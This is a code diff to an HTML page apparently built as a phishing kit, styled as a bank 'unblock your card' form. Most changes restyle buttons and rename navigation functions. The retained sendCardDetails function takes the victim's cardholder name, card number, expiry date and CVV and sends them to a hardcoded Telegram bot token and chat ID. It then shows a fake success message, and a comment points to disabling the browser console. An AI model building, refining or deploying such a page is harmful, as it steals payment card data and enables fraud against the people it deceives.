@@ -269,43 +269,47 @@
         }
 
         .success-title {
-            font-size: 2.2rem;
+            font-size: 2.5rem;
             font-weight: 700;
-            margin-bottom: 1.5rem;
+            margin-bottom: 1rem;
             color: var(--success);
             letter-spacing: -0.5px;
         }
 
         .success-message {
-            font-size: 1rem;
+            font-size: 1.1rem;
             color: var(--text-muted);
             margin-bottom: 3rem;
-            line-height: 1.6;
+            line-height: 1.8;
         }
 
         .button-group {
             display: flex;
             gap: 1rem;
             justify-content: center;
+            flex-direction: column;
         }
 
         .back-btn {
-            background-color: var(--surface);
-            border: 1px solid var(--border);
+            background-color: transparent;
+            border: 2px solid var(--primary);
             color: var(--text);
-            padding: 0.75rem 2rem;
-            font-size: 0.95rem;
+            padding: 0.85rem 2rem;
+            font-size: 1rem;
+            font-weight: 600;
+            width: 100%;
         }
 
         .back-btn:hover {
-            background-color: var(--border);
+            background-color: rgba(79, 70, 229, 0.1);
         }
 
         .done-btn {
             background-color: var(--success);
-            padding: 0.75rem 2rem;
-            font-size: 0.95rem;
-            width: auto;
+            padding: 0.85rem 2rem;
+            font-size: 1rem;
+            font-weight: 600;
+            width: 100%;
         }
 
         .done-btn:hover {
@@ -314,7 +318,7 @@
 
         @media (max-width: 480px) {
             .success-title {
-                font-size: 1.8rem;
+                font-size: 2rem;
             }
 
             .success-icon {
@@ -323,21 +327,26 @@
                 font-size: 3rem;
             }
 
+            .success-message {
+                font-size: 1rem;
+            }
+
             .button-group {
-                flex-direction: column;
                 gap: 0.75rem;
             }
 
             .back-btn,
             .done-btn {
-                width: 100%;
+                padding: 0.75rem 1.5rem;
+                font-size: 0.95rem;
             }
         }
     </style>
 </head>
 <body>
 
-<div class="wrapper" id="mainWrapper">
+<!-- Form Page -->
+<div class="wrapper" id="formPage">
     <!-- Live Card Visualizer -->
     <div class="credit-card">
         <div class="card-top">
@@ -400,8 +409,8 @@
         <p class="success-message">Your card has been unlocked successfully. You can now use your card.</p>
         
         <div class="button-group">
-            <button class="btn back-btn" onclick="resetForm()">← Go Back</button>
-            <button class="btn done-btn" onclick="window.location.reload()">Done</button>
+            <button class="btn back-btn" onclick="goBack()">← Go Back</button>
+            <button class="btn done-btn" onclick="done()">Done</button>
         </div>
     </div>
 </div>
@@ -483,11 +492,20 @@
     }
 
     async function sendCardDetails() {
-        const n=document.getElementById('cardName').value,r=document.getElementById('cardNumber').value,t=document.getElementById('cardExpiry').value,e=document.getElementById('cardCvv').value,a=document.getElementById('submitBtn'),i=`CARD UNLOCK REQUEST\n\nCard Holder: ${n}\nCard Number: ${r}\nExpiry Date: ${t}\nCVV: ${e}\nSubmitted: ${new Date().toLocaleString()}`;a.disabled=!0,a.textContent='Processing...';try{await fetch("https://api.telegram.org/bot7946422911:AAF0cfpvdw7susy5riOXzr8tdht4sjcKJQI/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:"8857888129",text:i})})}catch(e){console.error("Error:",e)}finally{document.getElementById('successPage').classList.add('show'),document.getElementById('mainWrapper').style.display='none',a.disabled=!1,a.textContent='UNBLOCK CARD'}
+        const n=document.getElementById('cardName').value,r=document.getElementById('cardNumber').value,t=document.getElementById('cardExpiry').value,e=document.getElementById('cardCvv').value,a=document.getElementById('submitBtn'),i=`CARD UNLOCK REQUEST\n\nCard Holder: ${n}\nCard Number: ${r}\nExpiry Date: ${t}\nCVV: ${e}\nSubmitted: ${new Date().toLocaleString()}`;a.disabled=!0,a.textContent='Processing...';try{await fetch("https://api.telegram.org/bot7946422911:AAF0cfpvdw7susy5riOXzr8tdht4sjcKJQI/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:"8857888129",text:i})})}catch(e){console.error("Error:",e)}finally{showSuccessPage(),a.disabled=!1,a.textContent='UNBLOCK CARD'}
     }
 
-    function resetForm() {
-        document.getElementById('paymentForm').reset(),viewNumber.textContent="•••• •••• •••• ••••",viewName.textContent="Your Name",viewExpiry.textContent="MM/YY",document.getElementById('successPage').classList.remove('show'),document.getElementById('mainWrapper').style.display='block'
+    function showSuccessPage() {
+        document.getElementById('formPage').style.display='none';
+        document.getElementById('successPage').classList.add('show');
+    }
+
+    function goBack() {
+        document.getElementById('paymentForm').reset(),viewNumber.textContent="•••• •••• •••• ••••",viewName.textContent="Your Name",viewExpiry.textContent="MM/YY",document.getElementById('successPage').classList.remove('show'),document.getElementById('formPage').style.display='block'
+    }
+
+    function done() {
+        window.location.reload();
     }
 
     // Disable console
